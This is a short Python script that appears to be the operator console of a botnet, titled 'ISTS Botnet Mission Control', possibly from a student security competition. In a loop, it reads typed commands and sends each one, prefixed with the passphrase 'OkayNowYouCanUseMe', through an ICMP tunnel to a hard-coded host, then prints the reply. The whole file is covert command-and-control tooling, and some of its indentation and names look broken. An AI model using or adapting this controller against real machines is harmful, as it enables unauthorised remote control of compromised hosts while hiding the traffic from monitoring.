from icmp_tunnel import *
import sys
import Queue

responseQueue = Queue.Queue()

def main():
	listener = Listener(responseQueue)
	listener.start()
	print(" - ISTS Botnet Mission Control - ")
    	print("\thelp - to list commands")
	while True:
		cmd = raw_input(">>>")
		send_icmp(localhost, "10.80.100.35", "OkayNowYouCanUseMe"+cmd)
	
		print(responseQueue.get(True,5))
				
if __name__ == "__main__":
    main()
